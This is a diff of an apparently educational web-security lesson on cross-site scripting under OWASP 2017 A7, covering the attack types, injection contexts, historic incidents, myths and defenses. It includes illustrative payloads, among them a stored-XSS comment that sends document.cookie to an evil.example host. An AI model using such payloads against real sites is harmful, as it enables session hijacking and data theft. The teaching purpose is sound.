@@ -215,49 +215,199 @@
         </a>
         
         <div class="content">
-            <h1>Cross-Site Scripting (XSS) - Overview</h1>
+            <h1>A7:2017 &ndash; Cross-Site Scripting (XSS)</h1>
 
-<h2>What is XSS?</h2>
-
-<strong>Cross-Site Scripting (XSS)</strong> enables attackers to inject malicious scripts into web pages viewed by other users. When victims load the page, the malicious script executes in their browser, potentially stealing cookies, session tokens, or performing actions on their behalf.
-
-<h3>Types of XSS</h3>
-
-<ol>
-<li><strong>Reflected XSS</strong>: Script reflected off web server (URL parameters)</li>
-<li><strong>Stored XSS</strong>: Script stored in database and displayed to users</li>
-<li><strong>DOM-based XSS</strong>: Vulnerability in client-side JavaScript</li>
-</ol>
-
-<h3>Example Attack</h3>
-
-<p>``<code>html</p>
-<!-- Vulnerable search page -->
-<h1>Results for: <?php echo $_GET['q']; ?></h1>
-
-<!-- Attack URL -->
-<p>http://site.com/search?q=<script>alert(document.cookie)</script></p>
-</code>``
-
-<h2>Why XSS Matters</h2>
-
-<p>XSS was #7 in OWASP Top 10 2017 and remains critical:</p>
-
+<div class="toc">
+<h2>Table of Contents</h2>
 <ul>
-<li>Session hijacking</li>
-<li>Credential theft</li>
-<li>Malware distribution</li>
-<li>Website defacement</li>
-<li>Phishing attacks</li>
+<li><a href="#what-is-xss">What is Cross-Site Scripting?</a></li>
+<li><a href="#why-it-matters">Why Does XSS Matter?</a></li>
+<li><a href="#technical-context">Technical Context: The Three Types</a></li>
+<li><a href="#real-world-impact">Real-World Impact</a></li>
+<li><a href="#prevalence">Prevalence and Detection</a></li>
+<li><a href="#misunderstandings">Common Misunderstandings</a></li>
+<li><a href="#edition-note">A Note on the 2021 Edition</a></li>
+<li><a href="#self-assessment">Self-Assessment</a></li>
+</ul>
+</div>
+
+<h2 id="what-is-xss">What is Cross-Site Scripting?</h2>
+
+<p><strong>Cross-Site Scripting (XSS)</strong> is a vulnerability that lets an attacker cause a victim's browser to execute attacker-controlled JavaScript in the security context of a trusted site. The browser cannot tell the difference between script the developer intended to send and script an attacker smuggled into the page&mdash;both arrive inside the same HTML document, from the same origin, and run with the same privileges.</p>
+
+<p>That last point is what makes XSS dangerous. Because the injected code runs <em>as the site</em>, it inherits everything the site's own scripts can do: it can read the DOM, read non-<code>HttpOnly</code> cookies, call same-origin APIs with the victim's session, rewrite the page, and act on the user's behalf. The browser's Same-Origin Policy&mdash;the fundamental boundary that stops <code>evil.com</code> from reading <code>bank.com</code>&mdash;offers no protection here, because the malicious script <em>is</em> running as <code>bank.com</code>.</p>
+
+<p>At its root, XSS is an <strong>output-encoding failure</strong>. Untrusted data (a URL parameter, a form field, a stored comment, a value read from the DOM) is written into a page without being transformed into an inert, context-appropriate representation. The data crosses the boundary from "text to display" to "code to execute," and the browser dutifully executes it.</p>
+
+<h3>The Core Mechanism</h3>
+
+<pre><code>1. Attacker crafts a payload:      &lt;script&gt;steal(document.cookie)&lt;/script&gt;
+2. Payload reaches the app:        via URL, form, stored record, or DOM source
+3. App writes it into a page:      WITHOUT context-aware encoding
+4. Victim's browser parses it:     as markup/script, not as text
+5. Script executes as the origin:  full access to session, DOM, and APIs</code></pre>
+
+<p>The vulnerability is created at step 3 and exploited at step 4&mdash;often on completely different machines, and, for stored XSS, at completely different times. The fix always lives at step 3: encode (or sanitize) untrusted data for the exact context into which it is placed.</p>
+
+<h2 id="why-it-matters">Why Does XSS Matter?</h2>
+
+<h3>Business Impact</h3>
+<ul>
+<li><strong>Account Takeover</strong>: Stealing a session cookie or token, or silently changing a victim's email/password through same-origin requests, hands the attacker the account&mdash;no password required.</li>
+<li><strong>Mass, Self-Propagating Compromise</strong>: Stored XSS on a social feature can build a <em>worm</em> that spreads from profile to profile with every view, reaching enormous scale in hours (see Real-World Impact).</li>
+<li><strong>Payment and Data Theft</strong>: Injected JavaScript on a checkout or login page can skim card numbers and credentials keystroke-by-keystroke ("formjacking") and exfiltrate them to an attacker server.</li>
+<li><strong>Brand and Trust Damage</strong>: Defacement, forced redirects to malware or phishing, and fraudulent actions taken "by" the user all erode trust and invite regulatory scrutiny when personal data is exposed.</li>
+<li><strong>Regulatory Fallout</strong>: XSS that exposes personal or payment data triggers GDPR, PCI-DSS, and similar obligations, including breach notification.</li>
 </ul>
 
-<h2>Classic 2017 XSS Scenarios</h2>
+<h3>Technical Impact</h3>
+<ul>
+<li><strong>Session Hijacking</strong>: Reading <code>document.cookie</code> (when cookies lack <code>HttpOnly</code>) or a token stored in <code>localStorage</code> lets the attacker impersonate the user.</li>
+<li><strong>CSRF-Token Theft &amp; Request Forgery</strong>: Same-origin script can read anti-CSRF tokens from the DOM and then issue authenticated state-changing requests, defeating CSRF defenses entirely.</li>
+<li><strong>Keylogging &amp; UI Redress</strong>: Injected code can attach event listeners to capture keystrokes, or overlay fake login prompts to harvest credentials.</li>
+<li><strong>Content &amp; Behavior Manipulation</strong>: The attacker can rewrite any part of the page&mdash;prices, links, forms&mdash;and reroute form submissions to their own endpoint.</li>
+<li><strong>Pivot to Deeper Attacks</strong>: XSS is frequently the first link in a chain&mdash;bypassing CSRF protection, abusing an admin panel, or reaching internal APIs the victim's browser can see but the attacker cannot.</li>
+</ul>
+
+<h2 id="technical-context">Technical Context: The Three Types</h2>
+
+<p>XSS is traditionally classified by <em>where the untrusted data enters and where the injection is realized</em>. All three produce the same result&mdash;attacker script running as the origin&mdash;but they differ in delivery, persistence, and where the vulnerable code lives.</p>
+
+<h3>1. Reflected XSS</h3>
+
+<p>The payload travels in the request (typically a URL query parameter or form field) and is immediately "reflected" back in the response for that same request. Nothing is stored; the attack requires luring the victim into clicking a crafted link or submitting a crafted form.</p>
+
+<pre><code>Vulnerable (PHP):
+    &lt;h1&gt;Results for: &lt;?php echo $_GET['q']; ?&gt;&lt;/h1&gt;
+
+Attack URL:
+    https://site.example/search?q=&lt;script&gt;steal(document.cookie)&lt;/script&gt;
+
+Delivered via: phishing email, malicious ad, or a link on another site.</code></pre>
+
+<h3>2. Stored (Persistent) XSS</h3>
+
+<p>The payload is saved by the application&mdash;in a database, file, log, or cache&mdash;and later served to <em>every</em> user who views the affected page. No per-victim social engineering is needed: the trap is set once and springs on everyone who loads the content. This is the most dangerous class because it scales and can target privileged viewers (e.g., an admin reading a support ticket).</p>
+
+<pre><code>Attacker submits a comment:
+    { "body": "&lt;script&gt;fetch('//evil.example/c?='+document.cookie)&lt;/script&gt;" }
+
+Stored verbatim, then rendered unescaped for all readers:
+    &lt;div class="comment"&gt;&lt;script&gt; ... &lt;/script&gt;&lt;/div&gt;</code></pre>
+
+<h3>3. DOM-Based XSS</h3>
+
+<p>The vulnerability is entirely in <strong>client-side JavaScript</strong>: a script reads data from an attacker-controllable <em>source</em> (e.g., <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>postMessage</code> data) and passes it into a dangerous <em>sink</em> (e.g., <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>) without sanitization. The malicious data may never reach the server at all&mdash;everything after the <code>#</code> in a URL, for example, is not sent&mdash;so server-side defenses and server logs never see it.</p>
+
+<pre><code>Vulnerable client code:
+    element.innerHTML = "Hello " + location.hash.slice(1);
+
+Attack URL:
+    https://site.example/#&lt;img src=x onerror=steal(document.cookie)&gt;</code></pre>
+
+<blockquote>
+<p><strong>Source &rarr; Sink is the mental model.</strong> Every XSS is untrusted data flowing from a source to a sink that interprets it as code. Reflected and stored XSS realize the sink on the server (HTML written into the response); DOM XSS realizes it in the browser. Prevention means controlling that flow at the sink.</p>
+</blockquote>
+
+<h3>Injection Contexts</h3>
+
+<p>Where the data lands inside the page determines which characters are dangerous and how it must be encoded. The same input can be harmless in one context and catastrophic in another&mdash;which is why "just escape <code>&lt;</code> and <code>&gt;</code>" is not enough.</p>
+
+<table>
+<thead>
+<tr><th>Context</th><th>Example location</th><th>What breaks out</th></tr>
+</thead>
+<tbody>
+<tr><td>HTML body</td><td><code>&lt;div&gt;DATA&lt;/div&gt;</code></td><td><code>&lt; &gt; &amp;</code> start new tags</td></tr>
+<tr><td>HTML attribute</td><td><code>&lt;input value="DATA"&gt;</code></td><td>Quote closes the attribute; then <code>onX=</code> handlers</td></tr>
+<tr><td>JavaScript</td><td><code>var x = "DATA";</code></td><td>Quote/backslash/newline break out of the string</td></tr>
+<tr><td>URL</td><td><code>&lt;a href="DATA"&gt;</code></td><td><code>javascript:</code> scheme executes on click</td></tr>
+<tr><td>CSS</td><td><code>style="DATA"</code></td><td><code>expression()</code> (legacy), <code>url()</code> exfiltration</td></tr>
+</tbody>
+</table>
+
+<h2 id="real-world-impact">Real-World Impact</h2>
+
+<p>The following are well-documented <em>classes</em> of XSS incident. Details are described at a level that is publicly verifiable; treat any single figure as illustrative rather than exact.</p>
+
+<h3>Case Class 1: The Self-Propagating Worm (MySpace "Samy", 2005)</h3>
+<p><strong>Pattern</strong>: A stored XSS in a social-network profile carried JavaScript that, when any logged-in user viewed the infected profile, added the author as a friend <em>and copied itself onto the viewer's own profile</em>&mdash;a classic XSS worm. It reportedly spread to over a million profiles within roughly a day before the site was taken offline to clean up.</p>
+<p><strong>Lesson</strong>: Stored XSS on user-generated content is not a one-victim bug; it can become exponential. Sanitizing rich HTML and constraining what markup users may submit is essential wherever content is shown to other users.</p>
+
+<h3>Case Class 2: Feed/Timeline Worms (TweetDeck, 2014)</h3>
+<p><strong>Pattern</strong>: A stored XSS in a Twitter client caused specially crafted tweets to execute script in the browsers of users whose timelines displayed them, auto-retweeting and thereby self-propagating. The vendor briefly disabled the service to patch it.</p>
+<p><strong>Lesson</strong>: Any surface that renders other people's content&mdash;timelines, comments, chat, dashboards&mdash;is a stored-XSS surface. Client-side rendering of remote content needs the same rigor as server-side rendering.</p>
+
+<h3>Case Class 3: Client-Side Skimming / Formjacking (Magecart-style, 2018&ndash;ongoing)</h3>
+<p><strong>Pattern</strong>: Attackers inject JavaScript into checkout or payment pages&mdash;sometimes through a compromised third-party script&mdash;that quietly reads card numbers and personal data as the user types and posts them to an attacker server. Whether the entry point is stored XSS or a supply-chain compromise, the payload is the same class of same-origin script execution.</p>
+<p><strong>Lesson</strong>: A single injected script on a payment page can bleed data for months. A restrictive Content-Security-Policy that limits where scripts may load from and where the page may send data is a key mitigation for this class.</p>
+
+<h3>Case Class 4: Stored XSS in Marketplace/Support Content</h3>
+<p><strong>Pattern</strong>: Over the years, large marketplaces and SaaS tools have had stored XSS in listings, reviews, profile fields, or support tickets, letting an attacker's script run in the browser of any viewer&mdash;often specifically targeting the higher-privileged staff who review such content.</p>
+<p><strong>Lesson</strong>: The most valuable victim is frequently an administrator. Stored XSS that reaches an admin console can escalate to full application compromise.</p>
+
+<h2 id="prevalence">Prevalence and Detection</h2>
+
+<p>XSS has been among the most frequently reported web vulnerabilities for its entire history. In the 2017 OWASP Top 10 it was ranked <strong>A7</strong>, and OWASP characterized it as present in a large share of applications&mdash;driven by the sheer number of places where untrusted data is written into pages, and by frameworks that historically did not escape by default.</p>
+
+<p>Rather than cite a single percentage (figures vary by dataset and year), the durable picture is:</p>
+<ul>
+<li>XSS is <strong>highly prevalent and easy to introduce</strong>&mdash;every unescaped output is a potential instance.</li>
+<li>It is <strong>readily discoverable</strong> by automated scanners for the reflected and stored variants, though DOM-based XSS often requires client-side taint analysis to find.</li>
+<li>Impact ranges from <strong>nuisance to full account takeover and worm-scale spread</strong>, depending on context and the value of the compromised session.</li>
+<li>Modern auto-escaping frameworks (React, Angular, modern template engines) have <em>reduced</em> classic server-side reflected XSS, shifting the balance toward <strong>DOM-based XSS</strong> and misuse of escape hatches like <code>dangerouslySetInnerHTML</code>.</li>
+</ul>
+
+<blockquote>
+<p>Note: exact prevalence numbers differ between OWASP data calls, bug-bounty reports, and vendor scans. The reliable takeaway is that XSS remains common, is cheap to introduce, and can be severe&mdash;so defenses must be systematic, not case-by-case.</p>
+</blockquote>
+
+<h2 id="misunderstandings">Common Misunderstandings</h2>
+
+<h3>Myth 1: "We filter out &lt;script&gt; tags, so we're safe."</h3>
+<p><strong>Reality</strong>: Script executes from dozens of vectors that contain no <code>&lt;script&gt;</code> tag at all&mdash;<code>onerror</code>, <code>onload</code>, and other event-handler attributes; <code>javascript:</code> URLs; <code>&lt;svg&gt;</code> and <code>&lt;iframe&gt;</code> tricks; and more. Blacklist filtering is a losing game. Encode for the output context instead.</p>
+
+<h3>Myth 2: "Validating input on the server prevents XSS."</h3>
+<p><strong>Reality</strong>: Input validation is useful defense-in-depth, but XSS is fundamentally an <em>output</em> problem. The same stored value may be safe in a JSON API and lethal in an HTML page. Encoding must happen where the data is written, in the context it is written into.</p>
+
+<h3>Myth 3: "It's only reflected XSS&mdash;the payload isn't stored, so it's low risk."</h3>
+<p><strong>Reality</strong>: A reflected XSS link delivered by phishing or a malicious ad is a complete account-takeover primitive for anyone who clicks. "Not persistent" does not mean "not serious."</p>
+
+<h3>Myth 4: "Our framework auto-escapes, so XSS is impossible."</h3>
+<p><strong>Reality</strong>: Auto-escaping covers the common HTML-body case, but every framework has escape hatches (<code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>[innerHTML]</code>, <code>|safe</code>, <code>mark_safe</code>) and blind spots (URLs, inline event handlers, <code>&lt;script&gt;</code> blocks, DOM sinks). Auto-escaping is a strong default, not a guarantee.</p>
+
+<h3>Myth 5: "HttpOnly cookies stop XSS."</h3>
+<p><strong>Reality</strong>: <code>HttpOnly</code> stops the script from <em>reading the cookie</em>, which blocks one exfiltration path. It does nothing to stop the script from making authenticated same-origin requests, stealing CSRF tokens, keylogging, or defacing the page. It is a valuable mitigation, not a fix.</p>
+
+<h3>Myth 6: "DOM XSS is a server bug we can patch server-side."</h3>
+<p><strong>Reality</strong>: In pure DOM XSS the malicious data may never reach the server (e.g., it lives in the URL fragment after <code>#</code>). Only client-side code changes&mdash;avoiding dangerous sinks, using safe APIs like <code>textContent</code>, and adopting Trusted Types&mdash;can fix it.</p>
+
+<h2 id="edition-note">A Note on the 2021 Edition</h2>
+
+<p>This lesson uses the <strong>2017</strong> framing, where XSS is its own category, <strong>A7:2017 &ndash; Cross-Site Scripting</strong>. In the <strong>2021</strong> OWASP Top 10, XSS was <em>merged into <strong>A03:2021 &ndash; Injection</strong></em>, reflecting the view that XSS is injection into a browser parser, closely related to SQL and command injection. The vulnerability, mechanics, and defenses are unchanged&mdash;only the taxonomy moved. When you read modern material that lists Injection at A03, XSS is included there.</p>
+
+<h2 id="self-assessment">Self-Assessment</h2>
+
+<p>Ask these questions about your application:</p>
+<ul>
+<li>[ ] Is every untrusted value encoded for its <em>specific</em> output context (HTML, attribute, JS, URL, CSS) at the point it is written?</li>
+<li>[ ] Do you rely on framework auto-escaping, and have you audited every escape hatch (<code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>|safe</code>, <code>mark_safe</code>, <code>innerHTML</code>)?</li>
+<li>[ ] Is all rich, user-supplied HTML passed through a vetted sanitizer (e.g., DOMPurify) rather than a home-grown filter?</li>
+<li>[ ] Have you enumerated your DOM sinks (<code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout(string)</code>, <code>location</code>) and confirmed no untrusted source flows into them?</li>
+<li>[ ] Is a Content-Security-Policy deployed with nonces or hashes (not <code>unsafe-inline</code>), ideally with <code>strict-dynamic</code>?</li>
+<li>[ ] Are session cookies marked <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code>?</li>
+<li>[ ] Are you considering Trusted Types to lock down DOM-XSS sinks?</li>
+</ul>
+
+<p>If you answered "no" or "not sure" to several of these, you likely have exploitable XSS today.</p>
+
+<h2>Next Steps</h2>
 
 <ul>
-<li>Unescaped user input in HTML</li>
-<li>Rich text editors without sanitization</li>
-<li>JavaScript template injection</li>
-<li>JSON endpoints without Content-Type</li>
+<li><strong><a href="attack-vectors.html">Attack Vectors</a></strong>: The contexts, sinks, and bypasses attackers use to land script</li>
+<li><strong><a href="prevention.html">Prevention</a></strong>: Layered, context-aware defenses with real code and config</li>
+<li><strong><a href="examples.html">Examples</a></strong>: Vulnerable vs. secure code across HTML/JS, PHP, Python, and Node</li>
+<li><strong><a href="./lab/cross-site-scripting/">Hands-On Lab</a></strong>: Practice finding and fixing XSS in a safe, isolated environment</li>
 </ul>
 
         </div>
